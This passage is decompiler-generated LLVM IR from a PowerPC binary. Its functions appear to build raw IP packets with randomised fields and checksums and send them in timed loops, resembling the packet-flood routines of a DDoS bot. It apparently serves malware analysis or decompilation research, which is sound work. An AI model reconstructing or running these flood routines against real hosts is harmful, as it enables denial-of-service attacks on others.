  store i16 %v1_10002080, i16* %v4_10002080, align 2
  store i32 268443832, i32* @lr, align 4
  %v6_100020b4 = call i32 @function_10007c40(i32 %v3_10001e3c, i32 %v2_10001ee0, i32 1500, i32 0, i32 %v2_10002094, i32 16)
  %tmp34 = icmp ult i32 %stack_var_-1560.0, 50
  br i1 %tmp34, label %dec_label_pc_100020f8, label %dec_label_pc_100020c4

dec_label_pc_100020c4:                            ; preds = %dec_label_pc_10002028
  store i32 268443852, i32* @lr, align 4
  %v1_100020c8 = call i32 @function_10004a90(i32 0)
  %v2_100020e0 = icmp ult i32 %v1_100020c8, %v2_100020dc
  br i1 %v2_100020e0, label %dec_label_pc_100020f0, label %dec_label_pc_100020e8

dec_label_pc_100020e8:                            ; preds = %dec_label_pc_100020c4
  %v0_100020ec = call i32 @function_1000885c()
  br label %dec_label_pc_100020f0

dec_label_pc_100020f0:                            ; preds = %dec_label_pc_100020c4, %dec_label_pc_100020e8
  br label %dec_label_pc_100020f8

dec_label_pc_100020f8:                            ; preds = %dec_label_pc_10002028, %dec_label_pc_100020f0
  %stack_var_-1560.1 = phi i32 [ %stack_var_-1560.0, %dec_label_pc_10002028 ], [ 0, %dec_label_pc_100020f0 ]
  %v1_100020fc = add i32 %stack_var_-1560.1, 1
  br label %dec_label_pc_10001fd4

dec_label_pc_10002108:                            ; preds = %dec_label_pc_10001de0
  ret i32 %v1_10001e20

; uselistorder directives
  uselistorder i32 %v1_10001ff8, { 1, 0 }
  uselistorder i32 %v1_10001fac, { 1, 0 }
  uselistorder i32 %v2_10001ee0, { 9, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %stack_var_-1536, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-1552, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100020f8, { 1, 0 }
  uselistorder label %dec_label_pc_100020f0, { 1, 0 }
  uselistorder label %dec_label_pc_10002028, { 1, 0 }
  uselistorder label %dec_label_pc_10001e88, { 1, 0 }
  uselistorder label %dec_label_pc_10001e5c, { 1, 0 }
}

define i32 @function_10002120(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002120:
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v2_1000214c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1000214c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000d3a4.83 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002164.84 to i32), i32* @lr, align 4
  %v0_10002160 = call i32 @function_10006d8c()
  store i32 268444028, i32* @lr, align 4
  %v1_10002178 = call i32 @function_10004a90(i32 0)
  %v1_10002188 = call i32 @function_100004f0(i32 %arg2)
  %v3_10002190 = icmp eq i32 %v1_10002188, 0
  br i1 %v3_10002190, label %dec_label_pc_10002198, label %dec_label_pc_10002608

dec_label_pc_10002198:                            ; preds = %dec_label_pc_10002120
  %v2_1000219c = icmp sgt i32 %arg3, 2
  br i1 %v2_1000219c, label %dec_label_pc_100021c4, label %dec_label_pc_100021a4

dec_label_pc_100021a4:                            ; preds = %dec_label_pc_10002198
  %v5_100021b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d3f4.85 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100021c0 = call i32 @function_1000885c()
  br label %dec_label_pc_100021c4

dec_label_pc_100021c4:                            ; preds = %dec_label_pc_10002198, %dec_label_pc_100021a4
  store i32 268444116, i32* @lr, align 4
  %v3_100021d0 = call i32 @function_10007cbc(i32 2, i32 3, i32 255)
  %tmp71 = icmp sgt i32 %v3_100021d0, -1
  br i1 %tmp71, label %dec_label_pc_10002234.preheader, label %dec_label_pc_100021e8

dec_label_pc_100021e8:                            ; preds = %dec_label_pc_100021c4
  %v0_100021ec = call i32 @function_1000885c()
  br label %dec_label_pc_10002234.preheader

dec_label_pc_10002234.preheader:                  ; preds = %dec_label_pc_100021c4, %dec_label_pc_100021e8
  store i32 0, i32* %stack_var_-280, align 4
  %v2_10002208 = ptrtoint i32* %stack_var_-280 to i32
  %v2_1000220c = add i32 %v2_10002208, 168
  %v2_10002220 = add i32 %v2_10002208, 80
  br label %dec_label_pc_100021fc

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_10002234.preheader, %dec_label_pc_100021fc
  %v3_100021fc = phi i32 [ 0, %dec_label_pc_10002234.preheader ], [ %v1_1000222c, %dec_label_pc_100021fc ]
  %v1_10002204 = mul i32 %v3_100021fc, 4
  %v1_10002210 = add i32 %v2_1000220c, %v1_10002204
  %v1_10002214 = inttoptr i32 %v1_10002210 to i32*
  %v2_10002214 = load i32, i32* %v1_10002214, align 4
  %v1_10002224 = trunc i32 %v2_10002214 to i8
  %v3_10002224 = add i32 %v2_10002220, %v3_100021fc
  %v4_10002224 = inttoptr i32 %v3_10002224 to i8*
  store i8 %v1_10002224, i8* %v4_10002224, align 1
  %v3_10002228 = load i32, i32* %stack_var_-280, align 4
  %v1_1000222c = add i32 %v3_10002228, 1
  store i32 %v1_1000222c, i32* %stack_var_-280, align 4
  %tmp72 = icmp slt i32 %v1_1000222c, 20
  br i1 %tmp72, label %dec_label_pc_100021fc, label %dec_label_pc_10002240

dec_label_pc_10002240:                            ; preds = %dec_label_pc_100021fc
  %v1_10002244 = add i32 %arg4, 4
  %v1_10002248 = inttoptr i32 %v1_10002244 to i32*
  %v2_10002248 = load i32, i32* %v1_10002248, align 4
  store i32 268444248, i32* @lr, align 4
  %v3_10002254 = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002248, i32 %v1_10002244)
  %v1_10002264 = add i32 %arg4, 12
  %v1_10002268 = inttoptr i32 %v1_10002264 to i32*
  %v2_10002268 = load i32, i32* %v1_10002268, align 4
  store i32 268444276, i32* @lr, align 4
  %v2_10002270 = inttoptr i32 %v2_10002268 to i8*
  %v3_10002270 = call i32 @function_10008694(i8* %v2_10002270, i32 %v1_10002264)
  %v2_10002284 = load i32, i32* %v1_10002248, align 4
  %v6_100022a0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d41c.89 to i32), i32 %arg2, i32 %v2_10002284)
  %v1_100022ac = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v1_100022bc = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_100022bc, i32* %stack_var_-240, align 4
  %v1_100022f4 = call i32 @__asm_rlwimi(i32 10, i32 24, i32 4, i32 7)
  %v1_10002304 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002310 = call i32 @__asm_rlwinm(i32 %v1_10002304, i32 0, i32 16, i32 14)
  %v1_1000231c = call i32 @__asm_rlwinm(i32 %v1_10002310, i32 0, i32 15, i32 13)
  %v1_10002328 = call i32 @__asm_rlwinm(i32 %v1_1000231c, i32 0, i32 14, i32 12)
  %v1_10002334 = call i32 @__asm_rlwinm(i32 %v1_10002328, i32 0, i32 13, i32 11)
  %v1_10002340 = call i32 @__asm_rlwinm(i32 %v1_10002334, i32 0, i32 12, i32 10)
  %v1_1000234c = call i32 @__asm_rlwinm(i32 %v1_10002340, i32 0, i32 11, i32 9)
  %v1_10002358 = call i32 @__asm_rlwinm(i32 %v1_1000234c, i32 0, i32 9, i32 7)
  %v1_10002380 = add i32 %arg4, 8
  %v1_10002384 = inttoptr i32 %v1_10002380 to i32*
  %v2_10002384 = load i32, i32* %v1_10002384, align 4
  store i32 268444560, i32* @lr, align 4
  %v2_1000238c = inttoptr i32 %v2_10002384 to i8*
  %v3_1000238c = call i32 @function_10008694(i8* %v2_1000238c, i32 %v1_10002380)
  %v1_10002394 = urem i32 %v3_1000238c, 65536
  store i32 %v1_10002394, i32* @r3, align 4
  %v1_1000239c = call i32 @function_10007644(i32 %v1_10002394)
  %v2_1000247c = ptrtoint i32* %stack_var_-240 to i32
  %v2_10002488 = bitcast i32* %stack_var_-240 to i16*
  %v2_10002530 = ptrtoint i32* %stack_var_-220 to i32
  %v2_10002534 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10002538 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002550 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002558 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002580 = bitcast i32* %stack_var_-180 to i16*
  %v2_10002594 = ptrtoint i32* %stack_var_-128 to i32
  %v2_100025dc = add i32 %v3_10002270, %v1_10002178
  br label %dec_label_pc_100023a8

dec_label_pc_100023a8:                            ; preds = %dec_label_pc_100025f8, %dec_label_pc_10002240
  %stack_var_-244.0 = phi i32 [ 0, %dec_label_pc_10002240 ], [ %v1_100025fc, %dec_label_pc_100025f8 ]
  store i32 268444588, i32* @lr, align 4
  %v0_100023a8 = call i32 @function_1000815c()
  %v2_100023bc = load i32, i32* %v1_10002384, align 4
  store i32 268444616, i32* @lr, align 4
  %v2_100023c4 = inttoptr i32 %v2_100023bc to i8*
  %v3_100023c4 = call i32 @function_10008694(i8* %v2_100023c4, i32 %v1_10002380)
  %v3_100023cc = icmp eq i32 %v3_100023c4, 0
  br i1 %v3_100023cc, label %dec_label_pc_100023d4, label %dec_label_pc_100023e0

dec_label_pc_100023d4:                            ; preds = %dec_label_pc_100023a8
  store i32 268444632, i32* @lr, align 4
  %v0_100023d4 = call i32 @function_1000815c()
  br label %dec_label_pc_100023e0

dec_label_pc_100023e0:                            ; preds = %dec_label_pc_100023a8, %dec_label_pc_100023d4
  %v0_100023e0 = call i32 @function_1000066c()
  store i32 60, i32* @r3, align 4
  %v1_10002400 = call i32 @function_10007644(i32 60)
  store i32 268444688, i32* @lr, align 4
  %v0_1000240c = call i32 @function_1000815c()
  %v1_10002438 = urem i32 %v0_100023a8, 65536
  store i32 %v1_10002438, i32* %stack_var_-220, align 4
  store i32 268444752, i32* @lr, align 4
  %v0_1000244c = call i32 @function_1000815c()
  store i32 2, i32* %stack_var_-128, align 4
  %v3_10002488 = call i32 @function_10000e28(i16* %v2_10002488, i32 20)
  store i32 268444824, i32* @lr, align 4
  %v0_10002494 = call i32 @function_1000815c()
  store i32 %v0_100023e0, i32* %stack_var_-180, align 4
  store i32 40, i32* @r3, align 4
  %v1_10002520 = call i32 @function_10007644(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000254c.90 to i32), i32* @lr, align 4
  %v4_10002548 = call i32 @function_10007350(i32 %v2_10002530, i32 %v2_10002538, i32 20, i32 %v2_10002534)
  store i32 20, i32* @r5, align 4
  store i32 268445036, i32* @lr, align 4
  %v4_10002568 = call i32 @function_10007350(i32 %v2_10002550, i32 %v2_10002558, i32 20, i32 %v2_10002534)
  %v3_10002580 = call i32 @function_10000e28(i16* %v2_10002580, i32 52)
  store i32 268445112, i32* @lr, align 4
  %v6_100025b4 = call i32 @function_10007c40(i32 %v3_100021d0, i32 %v2_1000247c, i32 60, i32 0, i32 %v2_10002594, i32 16)
  %tmp73 = icmp ult i32 %stack_var_-244.0, 50
  br i1 %tmp73, label %dec_label_pc_100025f8, label %dec_label_pc_100025c4

dec_label_pc_100025c4:                            ; preds = %dec_label_pc_100023e0
  store i32 268445132, i32* @lr, align 4
  %v1_100025c8 = call i32 @function_10004a90(i32 0)
  %v2_100025e0 = icmp ult i32 %v1_100025c8, %v2_100025dc
  br i1 %v2_100025e0, label %dec_label_pc_100025f0, label %dec_label_pc_100025e8

dec_label_pc_100025e8:                            ; preds = %dec_label_pc_100025c4
  %v0_100025ec = call i32 @function_1000885c()
  br label %dec_label_pc_100025f0

dec_label_pc_100025f0:                            ; preds = %dec_label_pc_100025c4, %dec_label_pc_100025e8
  br label %dec_label_pc_100025f8

dec_label_pc_100025f8:                            ; preds = %dec_label_pc_100023e0, %dec_label_pc_100025f0
  %stack_var_-244.1 = phi i32 [ %stack_var_-244.0, %dec_label_pc_100023e0 ], [ 0, %dec_label_pc_100025f0 ]
  %v1_100025fc = add i32 %stack_var_-244.1, 1
  br label %dec_label_pc_100023a8

dec_label_pc_10002608:                            ; preds = %dec_label_pc_10002120
  ret i32 %v1_10002188

; uselistorder directives
  uselistorder i32 %v2_10002534, { 1, 0 }
  uselistorder i32 %v1_10002394, { 1, 0 }
  uselistorder i32 %v1_1000222c, { 1, 2, 0 }
  uselistorder i32 %v3_100021fc, { 1, 0 }
  uselistorder i32* %stack_var_-280, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2 }
  uselistorder i32 60, { 2, 4, 3, 6, 1, 7, 8, 0, 5 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100025f8, { 1, 0 }
  uselistorder label %dec_label_pc_100025f0, { 1, 0 }
  uselistorder label %dec_label_pc_100023e0, { 1, 0 }
  uselistorder label %dec_label_pc_100021fc, { 1, 0 }
  uselistorder label %dec_label_pc_10002234.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100021c4, { 1, 0 }
}

define i32 @function_10002620(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10002620:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 268445272, i32* @lr, align 4
  %v1_10002654 = call i32 @function_10004a90(i32 0)
  %v1_10002664 = call i32 @function_100004f0(i32 %arg2)
  %v3_1000266c = icmp eq i32 %v1_10002664, 0
  br i1 %v3_1000266c, label %dec_label_pc_10002674, label %dec_label_pc_10002a44

dec_label_pc_10002674:                            ; preds = %dec_label_pc_10002620
  %v2_10002678 = icmp sgt i32 %arg3, 1
  br i1 %v2_10002678, label %dec_label_pc_100026a0, label %dec_label_pc_10002680

dec_label_pc_10002680:                            ; preds = %dec_label_pc_10002674
  %v5_10002694 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d434.92 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000269c = call i32 @function_1000885c()
  br label %dec_label_pc_100026a0

dec_label_pc_100026a0:                            ; preds = %dec_label_pc_10002674, %dec_label_pc_10002680
  %v1_100026a4 = add i32 %arg4, 8
  %v1_100026a8 = inttoptr i32 %v1_100026a4 to i32*
  %v2_100026a8 = load i32, i32* %v1_100026a8, align 4
  store i32 268445364, i32* @lr, align 4
  %v2_100026b0 = inttoptr i32 %v2_100026a8 to i8*
  %v3_100026b0 = call i32 @function_10008694(i8* %v2_100026b0, i32 %v1_100026a4)
  store i32 268445388, i32* @lr, align 4
  %v3_100026c8 = call i32 @function_10007cbc(i32 2, i32 3, i32 255)
  %tmp60 = icmp sgt i32 %v3_100026c8, -1
  br i1 %tmp60, label %dec_label_pc_100026e8, label %dec_label_pc_100026e0

dec_label_pc_100026e0:                            ; preds = %dec_label_pc_100026a0
  %v0_100026e4 = call i32 @function_1000885c()
  br label %dec_label_pc_100026e8

dec_label_pc_100026e8:                            ; preds = %dec_label_pc_100026a0, %dec_label_pc_100026e0
  store i32 268445424, i32* @lr, align 4
  %v1_100026ec = call i32 @function_10004a90(i32 0)
  store i32 268445432, i32* @lr, align 4
  %v0_100026f4 = call i32 @function_10004970()
  %v2_100026fc = xor i32 %v1_100026ec, %v0_100026f4
  store i32 ptrtoint (i32* @global_var_10002708.95 to i32), i32* @lr, align 4
  %v1_10002704 = call i32 @function_100082d8(i32 %v2_100026fc)
  store i32 268445452, i32* @lr, align 4
  %v0_10002708 = call i32 @function_1000815c()
  %v2_10002710 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002714 = ptrtoint i32* %stack_var_-128 to i32
  store i32 268445480, i32* @lr, align 4
  %v3_10002724 = call i32 @function_10006e28(i32 %v2_10002714, i32 %v0_10002708, i32 1400)
  %v1_1000272c = add i32 %arg4, 4
  %v1_10002730 = inttoptr i32 %v1_1000272c to i32*
  %v2_10002730 = load i32, i32* %v1_10002730, align 4
  store i32 268445504, i32* @lr, align 4
  %v3_1000273c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002730, i32 %v1_1000272c)
  %v2_10002750 = load i32, i32* %v1_10002730, align 4
  %v6_1000276c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d458.96 to i32), i32 %arg2, i32 %v2_10002750)
  %v2_100028fc = bitcast i32* %stack_var_-168 to i16*
  %v2_10002964 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002968 = ptrtoint i32* %stack_var_-108 to i32
  %v2_1000296c = ptrtoint i32* %stack_var_-96 to i32
  %v2_1000298c = ptrtoint i32* %stack_var_-76 to i32
  %v2_100029b4 = bitcast i32* %stack_var_-108 to i16*
  %v2_100029c8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10002a10 = add i32 %v3_100026b0, %v1_10002654
  br label %dec_label_pc_10002770

dec_label_pc_10002770:                            ; preds = %dec_label_pc_10002a24, %dec_label_pc_100026e8
  %stack_var_-180.0 = phi i32 [ %tmp11, %dec_label_pc_100026e8 ], [ %v1_10002a28, %dec_label_pc_10002a24 ]
  %v0_10002770 = call i32 @function_1000066c()
  %v1_10002784 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10002784, i32* %stack_var_-168, align 4
  %v1_10002794 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10002794, i32* %stack_var_-168, align 4
  store i32 1440, i32* @r3, align 4
  %v1_100027b8 = call i32 @function_10007644(i32 1440)
  store i32 268445640, i32* @lr, align 4
  %v0_100027c4 = call i32 @function_1000815c()
  store i32 268445704, i32* @lr, align 4
  %v0_10002804 = call i32 @function_1000815c()
  %v1_1000280c = urem i32 %v0_10002804, 65536
  store i32 %v1_1000280c, i32* %stack_var_-148, align 4
  store i32 268445720, i32* @lr, align 4
  %v0_10002814 = call i32 @function_1000815c()
  store i32 268445736, i32* @lr, align 4
  %v0_10002824 = call i32 @function_1000815c()
  store i32 268445748, i32* @lr, align 4
  %v0_10002830 = call i32 @function_1000815c()
  %v1_10002844 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10002854 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002860 = call i32 @__asm_rlwinm(i32 %v1_10002854, i32 0, i32 16, i32 14)
  %v1_1000286c = call i32 @__asm_rlwinm(i32 %v1_10002860, i32 0, i32 15, i32 13)
  %v1_10002878 = call i32 @__asm_rlwinm(i32 %v1_1000286c, i32 0, i32 14, i32 12)
  %v1_10002890 = or i32 %v1_10002878, 1572864
  %v1_1000289c = call i32 @__asm_rlwinm(i32 %v1_10002890, i32 0, i32 11, i32 9)
  %v1_100028a8 = call i32 @__asm_rlwinm(i32 %v1_1000289c, i32 0, i32 9, i32 7)
  %v1_100028b4 = call i32 @__asm_rlwinm(i32 %v1_100028a8, i32 0, i32 10, i32 8)
  store i32 2, i32* %stack_var_-56, align 4
  %v3_100028fc = call i32 @function_10000e28(i16* %v2_100028fc, i32 20)
  %v3_10002914 = call i32 @function_10000e28(i16* %v2_100028fc, i32 40)
  store i32 %v0_10002770, i32* %stack_var_-108, align 4
  store i32 1420, i32* @r3, align 4
  %v1_10002954 = call i32 @function_10007644(i32 1420)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002980.97 to i32), i32* @lr, align 4
  %v4_1000297c = call i32 @function_10007350(i32 %v2_10002964, i32 %v2_1000296c, i32 20, i32 %v2_10002968)
  store i32 1400, i32* @r5, align 4
  store i32 268446112, i32* @lr, align 4
  %v4_1000299c = call i32 @function_10007350(i32 %v2_10002714, i32 %v2_1000298c, i32 1400, i32 %v2_10002968)
  %v3_100029b4 = call i32 @function_10000e28(i16* %v2_100029b4, i32 1432)
  store i32 268446188, i32* @lr, align 4
  %v6_100029e8 = call i32 @function_10007c40(i32 %v3_100026c8, i32 %v2_10002710, i32 1440, i32 0, i32 %v2_100029c8, i32 16)
  %tmp61 = icmp ult i32 %stack_var_-180.0, 50
  br i1 %tmp61, label %dec_label_pc_10002a24, label %dec_label_pc_100029f8

dec_label_pc_100029f8:                            ; preds = %dec_label_pc_10002770
  store i32 268446208, i32* @lr, align 4
  %v1_100029fc = call i32 @function_10004a90(i32 0)
  %v2_10002a14 = icmp ult i32 %v1_100029fc, %v2_10002a10
  br i1 %v2_10002a14, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a34

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_100029f8
  br label %dec_label_pc_10002a24

dec_label_pc_10002a24:                            ; preds = %dec_label_pc_10002770, %dec_label_pc_10002a1c
  %stack_var_-180.1 = phi i32 [ %stack_var_-180.0, %dec_label_pc_10002770 ], [ 0, %dec_label_pc_10002a1c ]
  %v1_10002a28 = add i32 %stack_var_-180.1, 1
  br label %dec_label_pc_10002770

dec_label_pc_10002a34:                            ; preds = %dec_label_pc_100029f8
  store i32 ptrtoint ([3 x i8]* @global_var_10002a3c.98 to i32), i32* @lr, align 4
  %v1_10002a38 = call i32 @function_100048e0(i32 %v3_100026c8)
  %v0_10002a40 = call i32 @function_1000885c()
  br label %dec_label_pc_10002a44

dec_label_pc_10002a44:                            ; preds = %dec_label_pc_10002620, %dec_label_pc_10002a34
  %v0_10002a5c = phi i32 [ %v1_10002664, %dec_label_pc_10002620 ], [ %v0_10002a40, %dec_label_pc_10002a34 ]
  ret i32 %v0_10002a5c

; uselistorder directives
  uselistorder i32 %v2_10002968, { 1, 0 }
  uselistorder i32 %v2_10002714, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10007c40, { 2, 1, 0 }
  uselistorder i32 1420, { 1, 0 }
  uselistorder i32 1440, { 0, 2, 1 }
  uselistorder i32 ()* @function_1000066c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10001d04, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_100004f0, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002a44, { 1, 0 }
  uselistorder label %dec_label_pc_10002a24, { 1, 0 }
  uselistorder label %dec_label_pc_100026e8, { 1, 0 }
  uselistorder label %dec_label_pc_100026a0, { 1, 0 }
}

define i32 @function_100037d8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100037d8:
  %v3_100037fc = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003814 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000dc24.158 to i32), i32 %v3_100037fc, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_1000381c = load i32, i32* @global_var_10010488.143, align 4
  %v3_10003824 = load i32, i32* @global_var_10010484.159, align 4
  %v6_10003840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000dc34.160 to i32), i32 %v3_1000381c, i32 %v3_10003824)
  %v3_10003848 = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003860 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1000dc44.161 to i32), i32 %v3_10003848, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_10003860
}

define i32 @function_1000387c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000387c:
  %v5_100038b0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000dc4c.162 to i32), i32 %arg3, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_100038b0
}

define i32 @function_100038cc(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_100038cc:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100038cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100038cc, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10003924.preheader

dec_label_pc_1000390c:                            ; preds = %dec_label_pc_1000393c
  %v4_1000393c = ptrtoint i8* %stack_var_-68.056 to i32
  %v1_10003910 = add i32 %v4_1000393c, 1
  %v5_10003914 = inttoptr i32 %v1_10003910 to i8*
  %v1_1000391c = add i32 %stack_var_-60.055, 1
  store i32 %v1_1000391c, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c = call i32 @function_10006ed8()
  %v0_10003934 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003934 = icmp ult i32 %v0_10003934, %v0_1000392c
  br i1 %v2_10003934, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_1000393c:                            ; preds = %dec_label_pc_10003924.preheader, %dec_label_pc_1000390c
  %stack_var_-68.056 = phi i8* [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.162, %dec_label_pc_10003924.preheader ]
  %stack_var_-60.055 = phi i32 [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.161, %dec_label_pc_10003924.preheader ]
  %v2_10003940 = load i8, i8* %stack_var_-68.056, align 1
  %v3_10003948 = icmp eq i8 %v2_10003940, 32
  br i1 %v3_10003948, label %dec_label_pc_10003950, label %dec_label_pc_1000390c

dec_label_pc_10003950:                            ; preds = %dec_label_pc_1000390c, %dec_label_pc_1000393c, %dec_label_pc_10003924.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.161, %dec_label_pc_10003924.preheader ], [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.055, %dec_label_pc_1000393c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.162, %dec_label_pc_10003924.preheader ], [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.056, %dec_label_pc_1000393c ]
  %v4_10003950 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10003954 = add i32 %v4_10003950, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003964 = call i32 @function_10006ed8()
  %v0_1000396c = load i32, i32* %r29.global-to-local, align 4
  %v4_1000396c = icmp eq i32 %v0_1000396c, %v0_10003964
  br i1 %v4_1000396c, label %dec_label_pc_10003c2c, label %dec_label_pc_10003974

dec_label_pc_10003974:                            ; preds = %dec_label_pc_10003950
  %v5_10003958 = inttoptr i32 %v1_10003954 to i8*
  %v1_10003978 = add nuw nsw i32 %storemerge763, 1
  %tmp90 = icmp slt i32 %v1_10003978, 5
  br i1 %tmp90, label %dec_label_pc_10003924.preheader, label %dec_label_pc_100039a4.preheader

dec_label_pc_10003924.preheader:                  ; preds = %dec_label_pc_100038cc, %dec_label_pc_10003974
  %storemerge763 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %v1_10003978, %dec_label_pc_10003974 ]
  %stack_var_-68.162 = phi i8* [ %arg3, %dec_label_pc_100038cc ], [ %v5_10003958, %dec_label_pc_10003974 ]
  %stack_var_-60.161 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10003974 ]
  store i32 %stack_var_-60.161, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c50 = call i32 @function_10006ed8()
  %v0_1000393451 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000393452 = icmp ult i32 %v0_1000393451, %v0_1000392c50
  br i1 %v2_1000393452, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_100039a4.preheader:                  ; preds = %dec_label_pc_10003974
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac40 = call i32 @function_10006ed8()
  %v0_100039b441 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b442 = icmp ult i32 %v0_100039b441, %v0_100039ac40
  br i1 %v2_100039b442, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_10003998:                            ; preds = %dec_label_pc_100039bc
  %v1_1000399c = add i32 %storemerge845, 1
  store i32 %v1_1000399c, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac = call i32 @function_10006ed8()
  %v0_100039b4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b4 = icmp ult i32 %v0_100039b4, %v0_100039ac
